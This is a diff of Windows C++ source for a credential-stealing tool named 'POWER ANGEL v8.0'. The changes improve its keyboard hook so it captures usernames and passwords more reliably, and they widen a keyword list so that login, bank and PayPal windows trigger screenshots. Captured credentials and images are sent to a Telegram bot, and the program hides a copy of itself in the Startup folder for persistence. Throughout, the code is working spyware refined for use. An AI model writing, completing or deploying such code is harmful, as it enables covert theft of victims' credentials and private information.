@@ -20,11 +20,13 @@
 #include <fstream>
 #include <map>
 #include <queue>
+#include <condition_variable>
 
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "oleaut32.lib")
+#pragma comment(lib, "comctl32.lib")
 
 using namespace Gdiplus;
 
@@ -45,7 +47,7 @@ const wchar_t* MUTEX_NAME = L"PowerAngel_v8.0_Fixed";
 std::mutex g_mutex;
 std::wstring g_username, g_password;
 bool g_running = true;
-ULONG_PTR g_gdiplusToken;
+ULONG_PTR g_gdiplusToken = 0;
 HHOOK g_hKeyboardHook = NULL;
 std::wstring g_currentField;
 
@@ -67,7 +69,8 @@ void DebugLog(const std::wstring& message) {
     if (logfile.is_open()) {
         SYSTEMTIME st;
         GetLocalTime(&st);
-        logfile << L"[" << st.wHour << L":" << st.wMinute << L":" << st.wSecond << L"] ";
+        logfile << L"[" << std::setfill(L'0') << std::setw(2) << st.wHour << L":"
+                << std::setw(2) << st.wMinute << L":" << std::setw(2) << st.wSecond << L"] ";
         logfile << message << std::endl;
         logfile.close();
     }
@@ -76,37 +79,31 @@ void DebugLog(const std::wstring& message) {
 // ==================== UTF8 CONVERSION ====================
 std::string WStringToUTF8(const std::wstring& wstr) {
     if (wstr.empty()) return "";
-    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
     std::string str(size_needed, 0);
-    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], size_needed, NULL, NULL);
-    str.pop_back();
+    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &str[0], size_needed, NULL, NULL);
     return str;
 }
 
 // ==================== SIMPLE URL ENCODING ====================
 std::string URLEncode(const std::string& value) {
-    std::string encoded;
+    std::ostringstream encoded;
+    encoded.fill('0');
+    encoded << std::hex;
     
-    for (size_t i = 0; i < value.length(); i++) {
-        unsigned char c = value[i];
-        
+    for (unsigned char c : value) {
         if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
-            encoded.push_back((char)c);
+            encoded << c;
         }
         else if (c == ' ') {
-            encoded.push_back('+');
-        }
-        else if (c == '\n') {
-            encoded.append("%0A");
+            encoded << '+';
         }
         else {
-            char hex[4];
-            sprintf_s(hex, "%%%02X", c);
-            encoded.append(hex);
+            encoded << '%' << std::setw(2) << (int)c;
         }
     }
     
-    return encoded;
+    return encoded.str();
 }
 
 // ==================== TELEGRAM MESSAGE SENDER ====================
@@ -115,7 +112,7 @@ bool SendTelegram(const std::wstring& message) {
     std::string encoded_msg = URLEncode(utf8_msg);
     std::string post_data = "chat_id=" + std::string(CHAT_ID_ANSI) + "&text=" + encoded_msg;
     
-    DebugLog(L"[TELEGRAM] Sending: " + message.substr(0, min(50, (int)message.length())));
+    DebugLog(L"[TELEGRAM] Sending message");
     
     HINTERNET session = WinHttpOpen(L"PowerAngel/8.0", 
                                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
@@ -162,6 +159,11 @@ bool SendTelegram(const std::wstring& message) {
         }
     }
     
+    DWORD dwSize = 0;
+    if (result) {
+        WinHttpQueryDataAvailable(request, &dwSize);
+    }
+    
     WinHttpCloseHandle(request);
     WinHttpCloseHandle(connect);
     WinHttpCloseHandle(session);
@@ -171,19 +173,28 @@ bool SendTelegram(const std::wstring& message) {
 
 // ==================== TELEGRAM PHOTO UPLOADER ====================
 bool SendTelegramPhoto(const std::wstring& filepath, const std::wstring& caption = L"") {
-    DebugLog(L"[UPLOAD] Photo: " + filepath);
+    DebugLog(L"[UPLOAD] Attempting to upload: " + filepath);
     
     HANDLE hFile = CreateFileW(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, 
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return false;
+    if (hFile == INVALID_HANDLE_VALUE) {
+        DebugLog(L"[UPLOAD] Failed to open file");
+        return false;
+    }
     
     DWORD fileSize = GetFileSize(hFile, NULL);
+    if (fileSize == INVALID_FILE_SIZE) {
+        CloseHandle(hFile);
+        return false;
+    }
+    
     std::vector<BYTE> fileData(fileSize);
     DWORD bytesRead;
-    ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL);
+    if (!ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
+        CloseHandle(hFile);
+        return false;
+    }
     CloseHandle(hFile);
-    
-    if (bytesRead != fileSize) return false;
     
     char boundary[64];
     sprintf_s(boundary, "----AngelBoundary%llu", GetTickCount64());
@@ -213,7 +224,10 @@ bool SendTelegramPhoto(const std::wstring& filepath, const std::wstring& caption
                                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                    WINHTTP_NO_PROXY_NAME, 
                                    WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!session) return false;
+    if (!session) {
+        DebugLog(L"[UPLOAD] WinHttpOpen failed");
+        return false;
+    }
     
     WinHttpSetTimeouts(session, 60000, 60000, 60000, 60000);
     
@@ -221,6 +235,7 @@ bool SendTelegramPhoto(const std::wstring& filepath, const std::wstring& caption
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
     if (!connect) {
         WinHttpCloseHandle(session);
+        DebugLog(L"[UPLOAD] WinHttpConnect failed");
         return false;
     }
     
@@ -234,55 +249,79 @@ bool SendTelegramPhoto(const std::wstring& filepath, const std::wstring& caption
     if (!request) {
         WinHttpCloseHandle(connect);
         WinHttpCloseHandle(session);
+        DebugLog(L"[UPLOAD] WinHttpOpenRequest failed");
         return false;
     }
     
     std::string contentType = "Content-Type: multipart/form-data; boundary=" + std::string(boundary);
     std::wstring wcontentType(contentType.begin(), contentType.end());
-    WinHttpAddRequestHeaders(request, wcontentType.c_str(), (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
+    WinHttpAddRequestHeaders(request, wcontentType.c_str(), (DWORD)wcontentType.length(), WINHTTP_ADDREQ_FLAG_ADD);
     
     BOOL result = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                                    postData.data(), (DWORD)postData.size(), 
+                                    WINHTTP_NO_REQUEST_DATA, 0, 
                                     (DWORD)postData.size(), 0);
     
-    if (result) WinHttpReceiveResponse(request, NULL);
+    if (result) {
+        DWORD bytesWritten = 0;
+        result = WinHttpWriteData(request, postData.data(), (DWORD)postData.size(), &bytesWritten);
+        if (result) {
+            result = WinHttpReceiveResponse(request, NULL);
+        }
+    }
+    
+    if (result) {
+        DWORD dwSize = 0;
+        WinHttpQueryDataAvailable(request, &dwSize);
+    }
     
     WinHttpCloseHandle(request);
     WinHttpCloseHandle(connect);
     WinHttpCloseHandle(session);
     
+    // Delete the temporary file
     DeleteFileW(filepath.c_str());
     
+    DebugLog(L"[UPLOAD] Upload " + std::wstring(result ? L"succeeded" : L"failed"));
     return result != FALSE;
 }
 
 // ==================== FIXED KEYBOARD HOOK ====================
-// 🔥 CRITICAL FIX: Completely rewritten keylogger with proper character handling
+// Track shift and caps lock state globally
+static bool g_shiftPressed = false;
+static bool g_capsLock = false;
+
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
         KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
         
         if (wParam == WM_KEYDOWN) {
-            // 🔥 FIX 1: Track shift and caps lock state
-            static bool shiftPressed = false;
-            static bool capsLock = false;
+            // Update caps lock state
+            if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
+                g_capsLock = true;
+            } else {
+                g_capsLock = false;
+            }
             
-            // Update modifier states
+            // Update shift state
             if (pKb->vkCode == VK_SHIFT || pKb->vkCode == VK_LSHIFT || pKb->vkCode == VK_RSHIFT) {
-                shiftPressed = true;
-            }
-            if (pKb->vkCode == VK_CAPITAL) {
-                capsLock = !capsLock; // Toggle caps lock
+                g_shiftPressed = true;
+                DebugLog(L"[KEY] Shift pressed");
             }
             
-            // 🔥 FIX 2: Handle TAB key - mark field completion
+            // Toggle caps lock on VK_CAPITAL press
+            if (pKb->vkCode == VK_CAPITAL) {
+                g_capsLock = !g_capsLock;
+                DebugLog(L"[KEY] CapsLock toggled: " + std::wstring(g_capsLock ? L"ON" : L"OFF"));
+            }
+            
+            // Handle TAB key
             if (pKb->vkCode == VK_TAB) {
                 DebugLog(L"[KEY] TAB detected. Current field: " + g_currentField);
                 if (!g_currentField.empty()) {
                     if (g_username.empty()) {
                         g_username = g_currentField;
                         DebugLog(L"[KEY] Username SET: " + g_username);
-                    } else {
+                    } else if (g_password.empty()) {
                         g_password = g_currentField;
                         DebugLog(L"[KEY] Password SET (length: " + std::to_wstring(g_password.length()) + L")");
                     }
@@ -291,13 +330,23 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
             }
             
-            // 🔥 FIX 3: Handle ENTER key - send credentials
+            // Handle ENTER key
             if (pKb->vkCode == VK_RETURN) {
-                DebugLog(L"[KEY] ENTER detected. Username: " + 
-                        (g_username.empty() ? L"EMPTY" : L"SET") +
-                        L", Password: " + (g_password.empty() ? L"EMPTY" : L"SET"));
+                DebugLog(L"[KEY] ENTER detected. Checking credentials...");
                 
-                // If we have both fields, send them
+                // Check if we have text in current field but no tab was pressed
+                if (!g_currentField.empty()) {
+                    if (g_username.empty()) {
+                        g_username = g_currentField;
+                        DebugLog(L"[KEY] Single field (no TAB): " + g_username);
+                    } else if (g_password.empty()) {
+                        g_password = g_currentField;
+                        DebugLog(L"[KEY] Password from ENTER: " + g_password);
+                    }
+                    g_currentField.clear();
+                }
+                
+                // If we have both username and password, send them
                 if (!g_username.empty() && !g_password.empty()) {
                     g_totalCredentials++;
                     std::wstring creds = L"🔐 POWER ANGEL v8.0 - CREDENTIALS CAPTURED\n"
@@ -309,111 +358,93 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                                          L"═══════════════════════════";
                     
                     DebugLog(L"[KEY] Sending credentials to Telegram");
-                    SendTelegram(creds);
+                    std::thread([creds]() {
+                        SendTelegram(creds);
+                    }).detach();
                     
                     // Clear for next capture
                     g_username.clear();
                     g_password.clear();
-                    g_currentField.clear();
-                } else if (!g_currentField.empty()) {
-                    // If ENTER pressed with text but no TAB, assume it's a single field
-                    g_username = g_currentField;
-                    DebugLog(L"[KEY] Single field (no TAB): " + g_username);
-                    g_currentField.clear();
                 }
+                
+                g_currentField.clear();
                 return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
             }
             
-            // 🔥 FIX 4: Handle BACKSPACE
+            // Handle BACKSPACE
             if (pKb->vkCode == VK_BACK) {
                 if (!g_currentField.empty()) {
                     g_currentField.pop_back();
-                    DebugLog(L"[KEY] Backspace. Field now: " + g_currentField);
                 }
                 return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
             }
             
-            // 🔥 FIX 5: Handle all printable characters (SIMPLIFIED APPROACH)
-            // Check if it's a printable ASCII character
+            // Handle printable characters
             bool isPrintable = false;
+            WCHAR ch = 0;
             
-            // Letters A-Z (with shift/caps handling)
+            // Letters A-Z
             if (pKb->vkCode >= 0x41 && pKb->vkCode <= 0x5A) {
                 isPrintable = true;
-                WCHAR ch = (WCHAR)pKb->vkCode;
+                ch = (WCHAR)pKb->vkCode;
                 
-                // Handle shift and caps lock
-                bool shouldUppercase = (shiftPressed && !capsLock) || (!shiftPressed && capsLock);
+                // Determine case
+                bool uppercase = (g_shiftPressed && !g_capsLock) || (!g_shiftPressed && g_capsLock);
                 
-                if (shouldUppercase) {
-                    g_currentField += ch;
-                } else {
-                    g_currentField += (WCHAR)(ch + 32); // Convert to lowercase
+                if (!uppercase) {
+                    ch += 32; // Convert to lowercase
                 }
-                DebugLog(L"[KEY] Letter: " + std::wstring(1, ch) + L" -> " + 
-                        (shouldUppercase ? L"UPPER" : L"lower") + L" Field: " + g_currentField);
+                
+                g_currentField += ch;
+                DebugLog(L"[KEY] Letter: " + std::wstring(1, ch) + L" -> Field: " + g_currentField);
             }
-            // Numbers 0-9 (top row)
+            // Numbers 0-9
             else if (pKb->vkCode >= 0x30 && pKb->vkCode <= 0x39) {
                 isPrintable = true;
-                WCHAR ch = (WCHAR)pKb->vkCode;
+                ch = (WCHAR)pKb->vkCode;
                 
-                // Check for shift + number = symbol
-                if (shiftPressed) {
+                if (!g_shiftPressed) {
+                    g_currentField += ch;
+                    DebugLog(L"[KEY] Number: " + std::wstring(1, ch));
+                } else {
+                    // Handle shift + number symbols
                     const WCHAR symbols[] = {L')', L'!', L'@', L'#', L'$', L'%', L'^', L'&', L'*', L'('};
                     int index = pKb->vkCode - 0x30;
                     if (index >= 0 && index < 10) {
                         g_currentField += symbols[index];
                         DebugLog(L"[KEY] Symbol: " + std::wstring(1, symbols[index]));
                     }
-                } else {
-                    g_currentField += ch;
-                    DebugLog(L"[KEY] Number: " + std::wstring(1, ch) + L" Field: " + g_currentField);
                 }
             }
-            // Space bar
+            // Space
             else if (pKb->vkCode == VK_SPACE) {
                 isPrintable = true;
                 g_currentField += L' ';
-                DebugLog(L"[KEY] Space added. Field: " + g_currentField);
+                DebugLog(L"[KEY] Space");
             }
-            // Common symbols (using simplified mapping)
-            else if (pKb->vkCode == VK_OEM_MINUS) {
-                isPrintable = true;
-                g_currentField += shiftPressed ? L'_' : L'-';
-                DebugLog(L"[KEY] Minus/Underscore added");
-            }
-            else if (pKb->vkCode == VK_OEM_PERIOD) {
-                isPrintable = true;
-                g_currentField += shiftPressed ? L'>' : L'.';
-                DebugLog(L"[KEY] Period/Greater added");
-            }
-            else if (pKb->vkCode == VK_OEM_COMMA) {
-                isPrintable = true;
-                g_currentField += shiftPressed ? L'<' : L',';
-                DebugLog(L"[KEY] Comma/Less added");
-            }
-            else if (pKb->vkCode == VK_OEM_1) { // ;: key
-                isPrintable = true;
-                g_currentField += shiftPressed ? L':' : L';';
-                DebugLog(L"[KEY] Semicolon/Colon added");
-            }
-            else if (pKb->vkCode == VK_OEM_2) { // /? key
-                isPrintable = true;
-                g_currentField += shiftPressed ? L'?' : L'/';
-                DebugLog(L"[KEY] Slash/Question added");
-            }
-            
-            // Update shift state for keyup
-            if (pKb->vkCode == VK_SHIFT || pKb->vkCode == VK_LSHIFT || pKb->vkCode == VK_RSHIFT) {
-                shiftPressed = true;
+            // Common symbols
+            else {
+                // Map virtual keys to characters
+                BYTE keyboardState[256];
+                GetKeyboardState(keyboardState);
+                
+                WCHAR unicodeChar[2];
+                int result = ToUnicode(pKb->vkCode, pKb->scanCode, keyboardState, unicodeChar, 2, 0);
+                
+                if (result > 0) {
+                    ch = unicodeChar[0];
+                    if (ch >= 32 && ch <= 126) { // Printable ASCII
+                        g_currentField += ch;
+                        DebugLog(L"[KEY] Char: " + std::wstring(1, ch));
+                    }
+                }
             }
             
         } else if (wParam == WM_KEYUP) {
             // Clear shift state on keyup
-            KBDLLHOOKSTRUCT* pKbUp = (KBDLLHOOKSTRUCT*)lParam;
-            if (pKbUp->vkCode == VK_SHIFT || pKbUp->vkCode == VK_LSHIFT || pKbUp->vkCode == VK_RSHIFT) {
-                // shiftPressed = false; // Will be updated on next keydown
+            if (pKb->vkCode == VK_SHIFT || pKb->vkCode == VK_LSHIFT || pKb->vkCode == VK_RSHIFT) {
+                g_shiftPressed = false;
+                DebugLog(L"[KEY] Shift released");
             }
         }
     }
@@ -433,25 +464,25 @@ std::wstring GetActiveWindowTitle() {
     return L"";
 }
 
-// ==================== SIMPLIFIED LOGIN DETECTION ====================
+// ==================== LOGIN DETECTION ====================
 bool IsLoginPage(const std::wstring& title) {
     if (title.empty()) return false;
     
     std::wstring lower = title;
     std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
     
-    // Simplified detection - just look for keywords in window title
     std::vector<std::wstring> keywords = {
         L"login", L"sign in", L"signin", L"log in", L"password",
         L"gmail", L"google", L"facebook", L"outlook", L"microsoft",
         L"yahoo", L"amazon", L"bank", L"paypal", L"twitter",
         L"instagram", L"netflix", L"spotify", L"whatsapp", L"telegram",
-        L"account", L"email", L"username", L"credential"
+        L"account", L"email", L"username", L"credential", L"auth",
+        L"authentication", L"sign on", L"gateway", L"portal"
     };
     
     for (const auto& keyword : keywords) {
         if (lower.find(keyword) != std::wstring::npos) {
-            DebugLog(L"[DETECT] Login keyword found: " + keyword + L" in: " + title);
+            DebugLog(L"[DETECT] Login keyword: " + keyword + L" in: " + title);
             return true;
         }
     }
@@ -459,7 +490,7 @@ bool IsLoginPage(const std::wstring& title) {
     return false;
 }
 
-// ==================== ASYNC SCREENSHOT SYSTEM ====================
+// ==================== SCREENSHOT LOGIC ====================
 bool ShouldTakeScreenshot(const std::wstring& windowTitle) {
     DWORD currentTime = GetTickCount();
     
@@ -469,24 +500,27 @@ bool ShouldTakeScreenshot(const std::wstring& windowTitle) {
     if (!hwnd || IsIconic(hwnd)) return false;
     
     // Skip system windows
-    if (windowTitle == L"Program Manager" || windowTitle == L"Start") return false;
-    
-    // Cooldown check
-    auto it = g_windowScreenshotHistory.find(windowTitle);
-    if (it != g_windowScreenshotHistory.end()) {
-        DWORD timeSinceLast = currentTime - it->second;
-        if (timeSinceLast < 180000) { // 3 minutes cooldown
-            return false;
-        }
-    }
-    
-    // Global cooldown
-    if (currentTime - g_lastScreenshotTime < 30000) { // 30 seconds
+    if (windowTitle == L"Program Manager" || windowTitle == L"Start" || 
+        windowTitle == L"Task Switching" || windowTitle.find(L"PowerAngel") != std::wstring::npos) {
         return false;
     }
     
     // Check if it's a login page
     if (!IsLoginPage(windowTitle)) {
+        return false;
+    }
+    
+    // Cooldown per window
+    auto it = g_windowScreenshotHistory.find(windowTitle);
+    if (it != g_windowScreenshotHistory.end()) {
+        DWORD timeSinceLast = currentTime - it->second;
+        if (timeSinceLast < 120000) { // 2 minutes cooldown per window
+            return false;
+        }
+    }
+    
+    // Global cooldown
+    if (currentTime - g_lastScreenshotTime < 45000) { // 45 seconds
         return false;
     }
     
@@ -521,83 +555,127 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
     return -1;
 }
 
-// ==================== ACTUAL SCREENSHOT FUNCTION ====================
+// ==================== SCREENSHOT FUNCTION ====================
 bool TakeScreenshotNow(const std::wstring& title) {
-    HWND hwnd = GetForegroundWindow();
-    if (!hwnd) return false;
+    DebugLog(L"[SCREENSHOT] Attempting screenshot: " + title);
     
-    HDC hdcScreen = GetDC(hwnd);
-    HDC hdcMem = CreateCompatibleDC(hdcScreen);
+    HWND hwnd = GetForegroundWindow();
+    if (!hwnd) {
+        DebugLog(L"[SCREENSHOT] No active window");
+        return false;
+    }
+    
+    // Check if window is minimized
+    if (IsIconic(hwnd)) {
+        DebugLog(L"[SCREENSHOT] Window is minimized");
+        return false;
+    }
+    
+    // Get window dimensions
     RECT rc;
-    GetWindowRect(hwnd, &rc);
+    if (!GetWindowRect(hwnd, &rc)) {
+        DebugLog(L"[SCREENSHOT] Failed to get window rect");
+        return false;
+    }
     
     int width = rc.right - rc.left;
     int height = rc.bottom - rc.top;
     
     if (width <= 0 || height <= 0) {
+        DebugLog(L"[SCREENSHOT] Invalid window dimensions");
+        return false;
+    }
+    
+    // Create device contexts
+    HDC hdcScreen = GetDC(hwnd);
+    HDC hdcMem = CreateCompatibleDC(hdcScreen);
+    
+    // Create bitmap
+    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, width, height);
+    if (!hbm) {
+        DebugLog(L"[SCREENSHOT] Failed to create bitmap");
         ReleaseDC(hwnd, hdcScreen);
         DeleteDC(hdcMem);
         return false;
     }
     
-    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, width, height);
+    // Copy screen to bitmap
     HBITMAP old = (HBITMAP)SelectObject(hdcMem, hbm);
     BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
     
+    // Convert to GDI+ bitmap
     Bitmap* bmp = Bitmap::FromHBITMAP(hbm, NULL);
+    
+    // Cleanup GDI resources
     SelectObject(hdcMem, old);
     DeleteObject(hbm);
     DeleteDC(hdcMem);
     ReleaseDC(hwnd, hdcScreen);
     
-    if (!bmp) return false;
-    
-    CLSID jpegClsid;
-    if (GetEncoderClsid(L"image/jpeg", &jpegClsid) == -1) {
-        delete bmp;
+    if (!bmp) {
+        DebugLog(L"[SCREENSHOT] Failed to create GDI+ bitmap");
         return false;
     }
     
+    // Get JPEG encoder
+    CLSID jpegClsid;
+    if (GetEncoderClsid(L"image/jpeg", &jpegClsid) == -1) {
+        delete bmp;
+        DebugLog(L"[SCREENSHOT] Failed to get JPEG encoder");
+        return false;
+    }
+    
+    // Create temp filename
     WCHAR tempPath[MAX_PATH];
     GetTempPathW(MAX_PATH, tempPath);
     
     SYSTEMTIME st;
     GetLocalTime(&st);
     WCHAR filename[MAX_PATH];
-    swprintf_s(filename, L"angel_v8_%d.jpg", ++g_totalScreenshots);
-    wcscat_s(tempPath, filename);
+    swprintf_s(filename, L"angel_v8_%d%02d%02d_%02d%02d%02d_%d.jpg", 
+               st.wYear, st.wMonth, st.wDay, 
+               st.wHour, st.wMinute, st.wSecond,
+               ++g_totalScreenshots);
     
+    std::wstring filepath = std::wstring(tempPath) + filename;
+    
+    // Set JPEG quality
     EncoderParameters encoderParams;
     encoderParams.Count = 1;
     encoderParams.Parameter[0].Guid = EncoderQuality;
     encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
     encoderParams.Parameter[0].NumberOfValues = 1;
-    ULONG quality = 85;
+    ULONG quality = 75;
     encoderParams.Parameter[0].Value = &quality;
     
-    Status stat = bmp->Save(tempPath, &jpegClsid, &encoderParams);
+    // Save image
+    Status stat = bmp->Save(filepath.c_str(), &jpegClsid, &encoderParams);
     delete bmp;
     
     if (stat != Ok) {
-        DebugLog(L"[ERROR] Failed to save screenshot");
+        DebugLog(L"[SCREENSHOT] Failed to save screenshot");
         return false;
     }
     
+    // Create caption
     std::wstring caption = L"🖼️ POWER ANGEL v8.0 - Smart Capture\n"
                           L"📁 Window: " + title + L"\n"
                           L"🔢 Capture: #" + std::to_wstring(g_totalScreenshots) + L"\n"
                           L"🕒 Time: " + std::to_wstring(st.wHour) + L":" + 
                           std::to_wstring(st.wMinute) + L":" + std::to_wstring(st.wSecond);
     
-    bool success = SendTelegramPhoto(tempPath, caption);
+    // Send to Telegram in a separate thread
+    bool uploadResult = SendTelegramPhoto(filepath, caption);
     
-    if (success) {
-        DebugLog(L"[SUCCESS] Screenshot #" + std::to_wstring(g_totalScreenshots) + L" sent");
+    if (uploadResult) {
+        DebugLog(L"[SUCCESS] Screenshot #" + std::to_wstring(g_totalScreenshots) + L" sent successfully");
     } else {
         DebugLog(L"[ERROR] Failed to upload screenshot");
+        // Clean up the file if upload failed
+        DeleteFileW(filepath.c_str());
     }
     
-    return success;
+    return uploadResult;
 }
 
 // ==================== NON-BLOCKING SCREENSHOT TRIGGER ====================
@@ -608,26 +686,29 @@ bool TakeSmartScreenshot() {
         return false;
     }
     
-    // 🔥 CRITICAL FIX: Queue screenshot instead of taking it synchronously
+    // Queue screenshot for async processing
     {
         std::lock_guard<std::mutex> lock(g_queueMutex);
         g_screenshotQueue.push(title);
     }
     g_queueCV.notify_one();
     
-    DebugLog(L"[SCREENSHOT] Queued for async capture: " + title);
+    DebugLog(L"[SCREENSHOT] Queued: " + title);
     return true;
 }
 
 // ==================== ASYNC SCREENSHOT WORKER ====================
 void AsyncScreenshotWorker() {
+    DebugLog(L"[WORKER] Async screenshot worker started");
+    
     while (g_running) {
         std::wstring title;
         
         {
             std::unique_lock<std::mutex> lock(g_queueMutex);
-            // Wait for a screenshot request
-            g_queueCV.wait(lock, [] { return !g_screenshotQueue.empty() || !g_running; });
+            g_queueCV.wait(lock, [] { 
+                return !g_screenshotQueue.empty() || !g_running; 
+            });
             
             if (!g_running) break;
             
@@ -638,46 +719,73 @@ void AsyncScreenshotWorker() {
         }
         
         if (!title.empty()) {
-            // Add small delay
-            std::this_thread::sleep_for(std::chrono::milliseconds(300));
+            // Small delay to ensure window is ready
+            std::this_thread::sleep_for(std::chrono::milliseconds(500));
             
-            // Take the actual screenshot
+            // Take screenshot
             TakeScreenshotNow(title);
         }
     }
+    
+    DebugLog(L"[WORKER] Async screenshot worker stopped");
 }
 
 // ==================== PERSISTENCE ====================
 void InstallPersistence() {
     WCHAR path[MAX_PATH], startup[MAX_PATH];
-    GetModuleFileNameW(NULL, path, MAX_PATH);
-    GetEnvironmentVariableW(L"APPDATA", startup, MAX_PATH);
-    wcscat_s(startup, L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\PowerAngel_v8.exe");
+    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) {
+        DebugLog(L"[PERSISTENCE] Failed to get module path");
+        return;
+    }
     
+    if (!SHGetSpecialFolderPathW(NULL, startup, CSIDL_STARTUP, FALSE)) {
+        DebugLog(L"[PERSISTENCE] Failed to get startup folder");
+        return;
+    }
+    
+    wcscat_s(startup, L"\\PowerAngel_v8.exe");
+    
+    // Copy to startup folder
     if (CopyFileW(path, startup, FALSE)) {
-        DebugLog(L"[PERSISTENCE] Installed to startup");
         SetFileAttributesW(startup, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+        DebugLog(L"[PERSISTENCE] Installed to startup: " + std::wstring(startup));
+    } else {
+        DebugLog(L"[PERSISTENCE] Failed to copy to startup");
     }
 }
 
 // ==================== HEARTBEAT THREAD ====================
 void HeartbeatThread() {
+    DebugLog(L"[HEARTBEAT] Heartbeat thread started");
+    
+    // Initial delay
     std::this_thread::sleep_for(std::chrono::minutes(2));
     
     while (g_running) {
-        std::wstring status = L"💓 POWER ANGEL v8.0 - STATUS\n"
-                             L"📸 Screenshots: " + std::to_wstring(g_totalScreenshots) + L"\n"
-                             L"🔑 Credentials: " + std::to_wstring(g_totalCredentials) + L"\n"
-                             L"🕒 Uptime: " + std::to_wstring(GetTickCount() / 3600000) + L"h";
+        std::wstring status = L"💓 POWER ANGEL v8.0 - STATUS REPORT\n"
+                             L"═══════════════════════════\n"
+                             L"📸 Screenshots Captured: " + std::to_wstring(g_totalScreenshots) + L"\n"
+                             L"🔑 Credentials Captured: " + std::to_wstring(g_totalCredentials) + L"\n"
+                             L"⏰ Uptime: " + std::to_wstring(GetTickCount() / 3600000) + L" hours\n"
+                             L"📅 Active Windows: " + std::to_wstring(g_windowScreenshotHistory.size()) + L"\n"
+                             L"═══════════════════════════";
         
         SendTelegram(status);
+        DebugLog(L"[HEARTBEAT] Status report sent");
         
-        std::this_thread::sleep_for(std::chrono::hours(6));
+        // Wait 6 hours
+        for (int i = 0; i < 360 && g_running; i++) { // 360 * 60 seconds = 6 hours
+            std::this_thread::sleep_for(std::chrono::seconds(60));
+        }
     }
+    
+    DebugLog(L"[HEARTBEAT] Heartbeat thread stopped");
 }
 
 // ==================== SCREENSHOT MONITOR THREAD ====================
 void ScreenshotMonitorThread() {
+    DebugLog(L"[MONITOR] Screenshot monitor started");
+    
     // Start async screenshot worker
     std::thread worker(AsyncScreenshotWorker);
     
@@ -686,12 +794,12 @@ void ScreenshotMonitorThread() {
     while (g_running) {
         DWORD currentTime = GetTickCount();
         
-        // Cleanup old history
-        if (currentTime - lastCleanup > 3600000) { // 1 hour
+        // Cleanup old history every hour
+        if (currentTime - lastCleanup > 3600000) {
             std::vector<std::wstring> toRemove;
             
             for (const auto& entry : g_windowScreenshotHistory) {
-                if (currentTime - entry.second > 7200000) { // 2 hours
+                if (currentTime - entry.second > 7200000) { // 2 hours old
                     toRemove.push_back(entry.first);
                 }
             }
@@ -704,42 +812,56 @@ void ScreenshotMonitorThread() {
             DebugLog(L"[CLEANUP] Removed " + std::to_wstring(toRemove.size()) + L" old entries");
         }
         
-        // Check if we should take a screenshot
+        // Check for screenshots
         TakeSmartScreenshot();
         
-        // Adaptive sleep
+        // Sleep to prevent high CPU usage
         std::this_thread::sleep_for(std::chrono::seconds(10));
     }
     
     // Signal worker to stop
     g_running = false;
     g_queueCV.notify_one();
-    if (worker.joinable()) worker.join();
+    
+    if (worker.joinable()) {
+        worker.join();
+    }
+    
+    DebugLog(L"[MONITOR] Screenshot monitor stopped");
 }
 
 // ==================== MAIN ENTRY POINT ====================
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+    // Initialize COM
+    CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    
+    // Initialize GDI+
+    GdiplusStartupInput gdiplusStartupInput;
+    GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL);
+    
     // Initialize logging
     DeleteFileW(L"power_angel_v8.log");
     DebugLog(L"═══════════════════════════");
-    DebugLog(L"🚀 POWER ANGEL v8.0 - FIXED KEYLOGGER EDITION");
+    DebugLog(L"🚀 POWER ANGEL v8.0 - STARTING");
     DebugLog(L"═══════════════════════════");
-    DebugLog(L"[INIT] Starting v8.0 with keylogger fixes...");
     
     // Single instance check
-    HANDLE mutex = CreateMutexW(NULL, TRUE, L"PowerAngel_v8.0_Fixed");
-    if (GetLastError() == ERROR_ALREADY_EXISTS) {
-        DebugLog(L"[INIT] Another instance already running. Exiting.");
